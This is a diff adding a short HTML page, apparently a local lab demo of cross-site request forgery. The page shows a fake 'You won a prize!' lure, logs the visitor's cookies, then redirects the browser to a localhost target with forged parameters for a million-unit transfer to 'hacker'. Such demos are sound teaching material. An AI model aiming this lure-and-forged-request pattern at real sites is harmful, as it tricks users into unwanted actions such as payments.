@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Totally Legit Page</title></head>
+<body style="font-family: sans-serif; padding: 2rem;">
+  <h1>🎉 You won a prize! (attacker.html)</h1>
+  <p id="status">Preparing navigation...</p>
+
+  <script>
+    console.log('[attacker.html] loaded at', new Date().toISOString());
+    console.log('[attacker.html] document.cookie visible here:', document.cookie || '(none)');
+
+    document.getElementById('status').textContent = 'Redirecting in 2 seconds — watch the console and Network tab...';
+
+    setTimeout(() => {
+      console.log('[attacker.html] navigating now via document.location');
+      // Change the port/host below to match wherever you serve target.html
+      document.location = 'http://127.0.0.1:8001/target.html?recipient=hacker&amount=1000000';
+    }, 8000);
+  </script>
+</body>
+</html>
